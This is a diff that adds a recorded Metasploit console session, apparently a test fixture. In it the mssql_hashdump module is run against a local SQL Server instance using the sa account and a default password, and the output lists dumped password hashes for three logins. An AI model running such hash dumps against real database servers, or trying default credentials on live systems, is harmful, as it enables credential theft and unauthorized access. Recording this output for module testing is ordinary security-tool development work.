@@ -1,0 +1,15 @@
+use auxiliary/scanner/mssql/mssql_hashdump
+Stopping all jobs...
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> run lhost=127.0.0.1 username=sa password=yourStrong(!)Password rhost=127.0.0.1 rport=1433 database=master Verbose=true
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> [!] 127.0.0.1:1433 - No active DB -- Credential data will not be saved!
+[*] 127.0.0.1:1433 - Instance Name: "ef5e85b2b9bf"
+[+] 127.0.0.1:1433 - Saving mssql12 = sa:0x02009DC67651D9B823B5B8C9DF5653B8358DD0439644FDE1046EFA14A98EDFE68DFDFE3477DB41F01C0BC62D3EBC81BA7E45BA3923388113214D258B49D919F750FAD911114F
+[+] 127.0.0.1:1433 - Saving mssql12 = ##MS_PolicyEventProcessingLogin##:0x02001B6FA316A71B8D97707600200328656D5107EBA80B7A94D0D6987CE6798B1EF0050C7CC55AC6EE6AFB643F51383C0C481431BEF59E0B2DF5C03C3D102475770FC9B54A05
+[+] 127.0.0.1:1433 - Saving mssql12 = ##MS_PolicyTsqlExecutionLogin##:0x0200875CE0A3322E192BF5EE952A44A7AF615CDCE5F135726ED20B31F36E640323B93B39C86E1D4D38E41E0584B7BAF44D3E5FF5147F7A5B30C7665EEF7A0F00F7F6C5540E46
+[*] 127.0.0.1:1433 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> jobs -K
+[*] Killing all sessions...
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> 
